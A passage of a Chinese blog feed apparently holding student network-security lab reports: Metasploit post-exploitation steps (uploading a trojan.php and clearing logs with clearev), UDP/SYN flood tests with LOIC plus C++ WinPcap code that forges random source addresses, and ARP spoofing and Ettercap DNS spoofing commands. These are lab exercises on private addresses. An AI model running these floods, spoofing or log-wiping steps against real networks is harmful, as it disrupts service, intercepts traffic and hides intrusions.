AUTHORITY\SYSTEM</code>，拥有最高权限。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692472731.png" alt="1565692472731"></p></li><li><p>输入<code>pwd</code>查看当前目录为<code>C:\WINDOWS\system32</code>。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692507605.png" alt="1565692507605"></p></li><li><p>输入命令<code>upload /root/trojan.php C:\</code>, 将攻击机上的文件上传至靶机。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692637821.png" alt="1565692637821"></p></li><li><p>输入<code>clearev</code>清除日志记录。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565692665054.png" alt="1565692665054"></p></li></ol><h1 id="总结"><a href="#总结" class="headerlink" title="总结"></a>总结</h1><p>​        通过<code>AWVS</code>软件对目标网站进行漏洞扫描，对于<code>Sql注入漏洞</code>、<code>XSS漏洞</code>原理有了更深的理解。通过分析分析扫描数据包，了解了<code>x-scan</code>的漏洞扫描原理。在搭建<code>Snort IDS</code>环境的过程中，由于软件不兼容，出现了一些问题，后期得到解决，在编写检测规则文件过程中，了解了<code>snort</code>的编写规则，在探测过程中，了解了<code>Snort</code>的使用原理，意识到了<code>Snort</code>的强大功能。通过对<code>mysql数据库漏洞</code>进行渗透测试，认识到了<code>Metasploit Framework</code>渗透测试工具的强大，同时意识到了提权漏洞<code>CVE-2012-5613</code>的危害性。</p>]]></content>
      
      
      <categories>
          
          <category> 网络安全实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> AWVS </tag>
            
            <tag> X-Scan </tag>
            
            <tag> snort IDS </tag>
            
            <tag> 网络扫描 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>DoS攻击 实验报告</title>
      <link href="/DoS%E6%94%BB%E5%87%BB-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html"/>
      <url>/DoS%E6%94%BB%E5%87%BB-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ol><li>使用一种<code>DoS工具</code>进行试验，通过抓包工具，分析验证2种<code>DoS攻击原理</code>。</li><li>尝试在<code>Windows</code>下编程实现<code>SYN Flood</code>攻击程序，并实现源地址伪装。<a id="more"></a></li></ol><h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="实验环境"><a href="#实验环境" class="headerlink" title="实验环境"></a>实验环境</h2><ol><li><p>攻击机：<code>windows10</code></p><p>IP地址：<code>10.122.232.200</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565669896292.png" alt="1565669896292"></p></li><li><p>靶机：<code>windows xp</code></p><p>IP地址：<code>10.122.219.188</code></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565669940728.png" alt="1565669940728"></p><p>靶机开放端口：</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565669968417.png" alt="1565669968417"></p></li></ol><h2 id="UDP-FLOOD"><a href="#UDP-FLOOD" class="headerlink" title="UDP FLOOD"></a>UDP FLOOD</h2><ol><li><p>UDP FLOOD攻击原理：</p><p>​        攻击者利用大量UDP小包冲击DNS服务器或Radius认证服务器、流媒体视频服务器。 100k pps的UDP Flood经常将线路上的骨干设备例如防火墙打瘫，造成整个网段的瘫痪。由于UDP协议是一种无连接的服务，在UDP FLOOD攻击中，攻击者可发送大量伪造源IP地址的小UDP包。但是，由于UDP协议是无连接性的，所以只要开了一个UDP的端口提供相关服务的话，那么就可针对相关的服务进行攻击。</p></li><li><p>使用攻击工具LOIC，填写靶机IP、攻击端口、UDP数据包内容<code>Hello</code><br><code>windows xp</code>、选择攻击模式、攻击速度进行攻击。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670190715.png" alt="1565670190715"></p></li><li><p>攻击机使用wireshark进行抓包，发现只有攻击机发送的数据包，没有靶机发送的数据包。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670222745.png" alt="1565670222745"></p></li><li><p>分析攻击机捕获的数据包：</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670275933.png" alt="1565670275933"></p><ul><li>数据包总长度为<code>58字节</code></li><li>IP包总长度为<code>44字节</code></li><li>协议类型为<code>UDP协议</code>（编号17）</li><li>源IP地址：<code>10.122.232.200</code>（攻击机IP地址）</li><li>目标IP地址：<code>10.122.219.188</code>（靶机IP地址）</li><li>UDP协议源端口号：57804（<strong>不同IP包的源端口号不相同，即攻击机与靶机建立了大量的UDP连接</strong>）</li><li>UDP协议目标端口号：<code>445</code>(和输入的目标端口号相同)</li><li>UDP长度：<code>24字节</code></li><li>校验和和校验和状态：未验证</li><li>数据段：<code>16字节</code>，为<code>ASCII码</code>格式，转换成字符串后为输入的内容<code>Hello windows xp</code></li></ul></li><li><p>靶机使用wireshark进行抓包，同样发现只有攻击机发送的数据包，没有靶机发送的数据包。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670472184.png" alt="1565670472184"></p></li><li><p>分析靶机捕获的数据包：</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670518121.png" alt="1565670518121"></p><ul><li>数据包总长度为<code>60字节</code>（比攻击机捕获的数据包多2字节）</li><li>数据段等其它内容和攻击机捕获的数据包内容相同</li></ul></li><li><p>判断DoS攻击是否成功。</p><ol><li><p>命令行ping百度网址无法收到回复，浏览器无法访问百度。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670618533.png" alt="1565670618533"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670632741.png" alt="1565670632741"></p></li><li><p>关闭攻击软件后，ping百度网址可以收到回复，浏览器可以正常访问百度网址。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670656998.png" alt="1565670656998"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670668505.png" alt="1565670668505"></p></li></ol></li><li><p>检查攻击机网络连接状态，发现建立大量UDP连接，说明了UDP FLOOD攻击的原理是<strong>攻击机向靶机同一端口发送多个UDP数据包，占用靶机资源，使靶机无法提供相关服务，从而使其与UDP相关的服务瘫痪。</strong></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670730395.png" alt="1565670730395"></p></li></ol><h2 id="SYN-FLOOD"><a href="#SYN-FLOOD" class="headerlink" title="SYN FLOOD"></a>SYN FLOOD</h2><ol><li><p>SYN FLOOD攻击原理：</p><p>​        SYN Flood不会完成TCP三次握手的第三步，也就是不发送确认连接的信息给服务器。这样，服务器无法完成第三次握手，但服务器不会立即放弃，服务器会不停的重试并等待一定的时间后放弃这个未完成的连接，这段时间叫做SYN timeout，这段时间大约30秒-2分钟左右。若是一个用户在连接时出现问题导致服务器的一个线程等待1分钟并不是什么大不了的问题，但是若有人用特殊的软件大量模拟这种情况，那后果就可想而知了。一个服务器若是处理这些大量的半连接信息而消耗大量的系统资源和网络带宽，这样服务器就不会再有空余去处理普通用户的正常请求(因为客户的正常请求比率很小)，即服务器无法正常工作。</p></li><li><p>使用攻击工具LOIC，填写靶机IP、攻击端口、TCP数据包内容<code>Hello</code>、选择攻击模式、攻击速度进行攻击。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670814412.png" alt="1565670814412"></p></li><li><p>攻击机使用wireshark进行抓包，不仅有攻击机发送的SYN数据包，还有靶机发送的ACK数据包，但是大量的SYN数据包并没有得到回复。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670847338.png" alt="1565670847338"></p></li><li><p>分析攻击机捕获的数据包：</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565670892972.png" alt="1565670892972"></p><ul><li>数据包总长度为<code>66字节</code></li><li>IP包总长度为<code>52字节</code></li><li>协议类型为<code>TCP协议</code>（编号6）</li><li>源IP地址：<code>10.122.232.200</code>（攻击机IP地址）</li><li>目标IP地址：<code>10.122.219.188</code>（靶机IP地址）</li><li>TCP协议源端口号：<code>3443</code>（<code>不同IP包的源端口号不相同，即攻击机与靶机建立了大量的UDP连接</code>）</li><li>TCP协议目标端口号：<code>135</code>(和输入的目标端口号相同)</li><li>TCP头长度：<code>24字节</code></li><li>数据段：<code>5字节</code>，只存在<code>push ack包</code>中，为<code>ASCII码</code>格式，转换成字符串后为输入的内容<code>Hello</code></li></ul></li><li><p>判断DoS攻击是否成功。</p><ol><li><p>命令行ping百度网址收到回复，但出现很大程度的丢包现象，浏览器可以访问百度，但需要等待的时间较长。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671054841.png" alt="1565671054841"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671070981.png" alt="1565671070981"></p></li><li><p>关闭攻击软件后，ping百度网址没有丢包，浏览器可以以正常的速度访问百度网址。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671094141.png" alt="1565671094141"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671103983.png" alt="1565671103983"></p></li></ol></li><li><p>检查攻击机网络连接状态，发现建立大量TCP连接，说明了TCP FLOOD攻击的原理是<strong>攻击机与靶机三次握手不完整，建立多个TCP连接，使靶机的资源耗尽，从而使其与TCP相关的服务瘫痪。</strong></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671149362.png" alt="1565671149362"></p></li></ol><h2 id="分析比较两种攻击方法"><a href="#分析比较两种攻击方法" class="headerlink" title="分析比较两种攻击方法"></a>分析比较两种攻击方法</h2><ol><li>原理：<ul><li>UDP FLOOD攻击：攻击机向靶机同一端口发送多个UDP数据包，占用靶机资源，使靶机无法提供相关服务，从而使其与UDP相关的服务瘫痪。</li><li>SYN FLOOD攻击：攻击机向靶机发送SYN数据包，建立TCP连接后，一直不完成三次握手，即与靶机建立多个TCP连接使靶机的资源耗尽，从而使其与TCP相关的服务瘫痪。</li></ul></li><li>攻击差别：<ul><li>UDP FLOOD攻击个人理解是流氓攻击，一直占用资源，使靶机毫无还手之力。</li><li>SYN FLOOD攻击当靶机有足够的资源进行回复时，还是可以访问其他网站的，即SYN FLOOD攻击不彻底。</li></ul></li></ol><h2 id="编程实现SYN-Flood攻击程序"><a href="#编程实现SYN-Flood攻击程序" class="headerlink" title="编程实现SYN Flood攻击程序"></a>编程实现SYN Flood攻击程序</h2><p>在Windows下编程实现SYN Flood攻击程序，实现源地址伪装</p><h3 id="实验环境-1"><a href="#实验环境-1" class="headerlink" title="实验环境"></a>实验环境</h3><ul><li><p>攻击机：<code>windows 10</code></p><p>IP地址：<code>10.122.213.156</code></p></li><li><p>靶机：<code>windows 10</code></p><p>IP地址：<code>10.122.232.200</code></p></li><li><p>编程工具：<code>VS2017</code></p></li></ul><h3 id="设计思路"><a href="#设计思路" class="headerlink" title="设计思路"></a>设计思路</h3><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671374533.png" alt="1565671374533"></p><h3 id="搭建编程环境"><a href="#搭建编程环境" class="headerlink" title="搭建编程环境"></a>搭建编程环境</h3><ol><li><p>下载安装<code>WinPcap运行库</code>，下载解压<code>WinPcap开发包</code>。</p></li><li><p>打开vs2017,新建<code>windows控制台应用程序</code>。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671574581.png" alt="1565671574581"></p></li><li><p>打开<code>项目属性-&gt;配置属性-&gt;c/c++-&gt;预处理器-&gt;预处理器定义</code>，在其中添加<code>WPCAP</code>、<code>HAVE_REMOTE</code>两个宏定义。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671724202.png" alt="1565671724202"></p></li><li><p>打开<code>项目属性-&gt;配置属性-&gt;链接器-&gt;输入-&gt;附加依赖项</code>添加<code>wpcap.lib</code>和<code>ws2_32.lib</code>两个库。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671740965.png" alt="1565671740965"></p></li><li><p>打开<code>项目属性-&gt;配置属性-&gt;VC++目录-&gt;包含目录</code>和同级的<code>库目录</code>分别添加之前下载解压的<code>WinPcap开发包</code>的<code>Include目录</code>和<code>Lib目录</code>路径。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671758936.png" alt="1565671758936"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671662749.png" alt="1565671662749"></p></li></ol><h3 id="数据结构"><a href="#数据结构" class="headerlink" title="数据结构"></a>数据结构</h3><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* SYN包结构 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">TCP_SYN</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> DstMAC[<span class="number">6</span>];  <span class="comment">// 目的mac地址  </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> SrcMAC[<span class="number">6</span>];  <span class="comment">// 源mac地址  </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> OtherData[<span class="number">12</span>];</span><br><span class="line"><span class="keyword">unsigned</span> short Header_ChechSum; <span class="comment">// 校验和  </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> SrcIP;       <span class="comment">// 源IP地址  </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> DstIP;       <span class="comment">// 目标IP地址</span></span><br><span class="line"><span class="keyword">unsigned</span> short SrcPort;   <span class="comment">// 源端口</span></span><br><span class="line"><span class="keyword">unsigned</span> short DstPort;   <span class="comment">// 目标端口</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Ohters[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">unsigned</span> short pak_checksum;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> OtherLast[<span class="number">1</span>];</span><br><span class="line">&#125;TCP_SYN, *PTCP_SYN;</span><br></pre></td></tr></table></figure><h3 id="实验结果"><a href="#实验结果" class="headerlink" title="实验结果"></a>实验结果</h3><ol><li><p>进行攻击，打开程序，输入目标IP和目标端口，可以看到攻击源IP地址和源端口在不断改变。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671832506.png" alt="1565671832506"></p></li><li><p>使用wireshark进行抓包可以看到伪造的地址向目标IP地址的目标端口135号端口发送大量TCP SYN包。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671864663.png" alt="1565671864663"></p></li><li><p>打开捕获的SYN包，源MAC地址也是随机的，SYN包内容与理论预期符合。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565671895895.png" alt="1565671895895"></p></li></ol><h3 id="实验总结"><a href="#实验总结" class="headerlink" title="实验总结"></a>实验总结</h3><p>​        在实验过程中，通过对局域网内的主机进行UDP FLOOF攻击，意外地把整个局域网攻击了，查资料发现大量UDP包会把局域网堵塞，导致局域网内主机无法上网，这是一种可行的攻击手段。又发现如果攻击机和靶机同时连接手机热点，则攻击无法成功，经过实验，得出的初步结论是两台主机不在同一局域网下，即手机热点不能看做是一个局域网。当然还有一种猜测是手机热点在转发UDP包时做了防护措施，这一猜测目前还未进行验证。</p><h3 id="实验核心代码"><a href="#实验核心代码" class="headerlink" title="实验核心代码"></a>实验核心代码</h3><p>点击下载程序源代码</p><figure class="highlight c++"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br></pre></td><td class="code"><pre><span class="line"><span class="comment">/* SYN包结构 */</span></span><br><span class="line"><span class="keyword">typedef</span> <span class="class"><span class="keyword">struct</span> _<span class="title">TCP_SYN</span></span></span><br><span class="line"><span class="class">&#123;</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> DstMAC[<span class="number">6</span>];  <span class="comment">// 目的mac地址  </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> SrcMAC[<span class="number">6</span>];  <span class="comment">// 源mac地址  </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> OtherData[<span class="number">12</span>];</span><br><span class="line"><span class="keyword">unsigned</span> short Header_ChechSum; <span class="comment">// 校验和  </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> SrcIP;       <span class="comment">// 源IP地址  </span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">int</span> DstIP;       <span class="comment">// 目标IP地址</span></span><br><span class="line"><span class="keyword">unsigned</span> short SrcPort;   <span class="comment">// 源端口</span></span><br><span class="line"><span class="keyword">unsigned</span> short DstPort;   <span class="comment">// 目标端口</span></span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> Ohters[<span class="number">16</span>];</span><br><span class="line"><span class="keyword">unsigned</span> short pak_checksum;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">char</span> OtherLast[<span class="number">1</span>];</span><br><span class="line">&#125;TCP_SYN, *PTCP_SYN;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 校验和函数 */</span></span><br><span class="line"><span class="function"><span class="keyword">unsigned</span> short <span class="title">checksum</span><span class="params">(<span class="keyword">unsigned</span> short *<span class="built_in">buffer</span>, <span class="keyword">int</span> <span class="built_in">size</span>)</span></span></span><br><span class="line"><span class="function"></span>&#123;</span><br><span class="line"><span class="keyword">unsigned</span> <span class="keyword">long</span> cksum = <span class="number">0</span>;</span><br><span class="line"><span class="keyword">while</span> (<span class="built_in">size</span> &gt; <span class="number">1</span>)</span><br><span class="line">&#123;</span><br><span class="line">cksum += *<span class="built_in">buffer</span>++;</span><br><span class="line"><span class="built_in">size</span> -= <span class="keyword">sizeof</span>(<span class="keyword">unsigned</span> short);</span><br><span class="line">&#125;</span><br><span class="line"><span class="keyword">if</span> (<span class="built_in">size</span>)</span><br><span class="line">&#123;</span><br><span class="line">cksum += *(<span class="keyword">unsigned</span> <span class="keyword">char</span>*)<span class="built_in">buffer</span>;</span><br><span class="line">&#125;</span><br><span class="line">cksum = (cksum &gt;&gt; <span class="number">16</span>) + (cksum &amp; <span class="number">0xffff</span>);</span><br><span class="line">cksum += (cksum &gt;&gt; <span class="number">16</span>);</span><br><span class="line"><span class="keyword">return</span>  (<span class="keyword">unsigned</span> short)(~cksum);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 源IP地址随机产生 */</span></span><br><span class="line">itoa(rand() % <span class="number">252</span> + <span class="number">3</span>, src_adr_part, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">strcpy</span>(src_adr, src_adr_part);</span><br><span class="line"><span class="keyword">for</span> (<span class="keyword">int</span> j = <span class="number">0</span>; j &lt; <span class="number">3</span>; j++)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">strcat</span>(src_adr, <span class="string">"."</span>);</span><br><span class="line">itoa(rand() % <span class="number">252</span> + <span class="number">3</span>, src_adr_part, <span class="number">10</span>);</span><br><span class="line"><span class="built_in">strcat</span>(src_adr, src_adr_part);</span><br><span class="line">&#125;</span><br><span class="line">SynData-&gt;SrcIP = inet_addr(src_adr);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 源端口随机产生 */</span></span><br><span class="line">src_port = (<span class="keyword">unsigned</span> short)rand() % <span class="number">65534</span> + <span class="number">1</span>;</span><br><span class="line">SynData-&gt;SrcPort = htons(src_port);</span><br><span class="line"></span><br><span class="line"><span class="comment">/* 检验校验和错误的包 */</span></span><br><span class="line"><span class="keyword">if</span> (pcap_sendpacket(fp, bufData, <span class="keyword">sizeof</span>(bufData) - <span class="number">1</span>) != <span class="number">0</span>)</span><br><span class="line">&#123;</span><br><span class="line"><span class="built_in">fprintf</span>(<span class="built_in">stderr</span>, <span class="string">"\nError sending the packet: \n"</span>, pcap_geterr(fp));</span><br><span class="line"><span class="keyword">return</span> <span class="number">-1</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> 网络安全实验 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> 网络安全 </tag>
            
            <tag> winpcap </tag>
            
            <tag> DoS攻击 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>ARP欺骗 实验报告</title>
      <link href="/ARP%E6%AC%BA%E9%AA%97-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html"/>
      <url>/ARP%E6%AC%BA%E9%AA%97-%E5%AE%9E%E9%AA%8C%E6%8A%A5%E5%91%8A.html</url>
      
        <content type="html"><![CDATA[<h1 id="实验内容"><a href="#实验内容" class="headerlink" title="实验内容"></a>实验内容</h1><ol><li>运行<code>Ettercap</code>，扫描在线主机，对目标主机进行<code>禁止上网</code>、<code>DNS欺骗</code>攻击，查看目标主机状态。</li><li>通过<code>WireShark</code>抓包工具，捕获<code>ARP欺骗攻击</code>的数据包，分析<code>ARP攻击</code>的原理。</li><li>基于<code>Winpcap</code>编写程序，对指定的目标IP地址进行<code>ARP欺骗攻击</code>。<a id="more"></a></li></ol><h1 id="实验过程"><a href="#实验过程" class="headerlink" title="实验过程"></a>实验过程</h1><h2 id="“禁止上网”攻击"><a href="#“禁止上网”攻击" class="headerlink" title="“禁止上网”攻击"></a>“禁止上网”攻击</h2><p>Kali攻击机利用<strong>arp欺骗后不进行IP转发</strong>对靶机CentOS进行“禁止上网”攻击</p><ol><li><p>打开两台虚拟机，利用命令ifconfig查看Kali的网络接口、ip等信息：Kali网络接口为<code>eth0</code>，IP地址为<code>192.168.88.130</code>。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661105370.png" alt="1565661105370"></p></li><li><p>利用命令ifconfig和route查看CentOS的IP地址和网关：CentOS的IP地址为<code>192.168.88.131</code>，网关为<code>192.168.88.2</code>。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661361464.png" alt="1565661361464"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661161089.png" alt="1565661161089"></p></li><li><p>攻击机利用Ettercap嗅探目标主机的IP地址和网关，网络接口选择eth0：嗅探到目标主机IP地址为<code>192.168.88.131</code>，网关为<code>192.168.88.2</code>，符合。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661280293.png" alt="1565661280293"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661290669.png" alt="1565661290669"></p></li><li><p>利用命令行<code>echo 0 &gt; /proc/sys/net/ipv4/ip_forward</code>关闭Kali的IP转发，利用命令行<code>arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</code>     即<code>arpspoof -i eth0</code><br><code>-c host -t 192.168.88.131 -r 192.168.88.2</code>得到靶机发送的消息。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661495435.png" alt="1565661495435"></p></li><li><p>使用CentOS ping 百度网址<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>发现无法连接百度，不能上网。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565666177653.png" alt="1565666177653"></p></li><li><p>利用Ctrl+C使Kali退出arp欺骗。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661553673.png" alt="1565661553673"></p></li><li><p>使用CentOS ping 百度网址<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>发现没有丢包，可以上网。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661576848.png" alt="1565661576848"></p></li></ol><h2 id="“DNS欺骗”攻击"><a href="#“DNS欺骗”攻击" class="headerlink" title="“DNS欺骗”攻击"></a>“DNS欺骗”攻击</h2><ol><li><p>利用命令<code>/etc/init.d/apache2 start</code>打开kali自带的Apache服务。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661632148.png" alt="1565661632148"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661652172.png" alt="1565661652172"></p></li><li><p>对<code>etter.dns</code>文件进行修改如下：</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661688492.png" alt="1565661688492"></p></li><li><p>Kali利用<code>Ettercap</code>进行<code>Unified sniffing</code>嗅探网络接口选择<code>eth0</code>，并在<code>Hosts</code>下选择<code>Scan for hosts</code>，然后选择<code>Hosts list</code>列出主机。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661743998.png" alt="1565661743998"></p></li><li><p>在<code>Mitm</code>中选择<code>Arp Poisoning</code>，勾选<code>Sniff remote connections</code>开启嗅探。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661839379.png" alt="1565661839379"></p></li><li><p>在<code>Plugins</code>下打开<code>Manage the plugins</code>，将<code>dns_spoof</code>插件双击选中。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661873307.png" alt="1565661873307"></p></li><li><p>选择CentOS的IP点击<code>Add to Target1</code>，接着选择CentOS的网关点击<code>Add to Target2</code>，然后点击<code>Start sniffing</code>，DNS欺骗完成。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661925221.png" alt="1565661925221"></p></li><li><p>使用CentOS ping百度地址<a href="http://www.baidu.com" target="_blank" rel="noopener">www.baidu.com</a>,发现ping到的IP地址为<code>192.168.88.130</code>,即Kali的IP地址,使用浏览器输入淘宝域名<a href="http://www.taobao.com" target="_blank" rel="noopener">www.taobao.com</a>,进入到Kali的<code>localhost页面</code>,表明DNS欺骗攻击成功。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661978661.png" alt="1565661978661"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565661988808.png" alt="1565661988808"></p></li><li><p>由于在修改etter.dns文件时只修改了<em>.com/</em>.rog/*.net,因此只能欺骗.com/.org/.net的域名，如可以正常访问<a href="www.leeyuxun.tk">www.leeyuxun.tk</a></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662157154.png" alt="1565662157154"></p></li></ol><h2 id="分析ARP攻击原理"><a href="#分析ARP攻击原理" class="headerlink" title="分析ARP攻击原理"></a>分析ARP攻击原理</h2><p>在Kali通过Ettercap嗅探CentOS的同时,通过WireShark抓包工具，捕获ARP欺骗攻击的数据包，分析ARP攻击的原理。</p><ol><li><p>利用命令行<code>echo 1 &gt; /proc/sys/net/ipv4/ip_forward</code>开启Kali的IP转发, 利用命令行<code>arpspoof [-i interface] [-c own|host|both] [-t target] [-r] host</code> 即<code>arpspoof -i eth0 -c host -t 192.168.88.131 -r 192.168.88.2</code>作为靶机消息转发的中间人。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662324778.png" alt="1565662324778"></p></li><li><p>利用WireShark抓包工具抓取ARP包。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662344454.png" alt="1565662344454"></p></li><li><p>双击打开其中一条ARP报文,根据ARP报文格式分析如下。</p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662364992.png" alt="1565662364992"></p><p><img src="https://leeyuxun-1258157351.cos.ap-beijing.myqcloud.com/img/1565662370836.png" 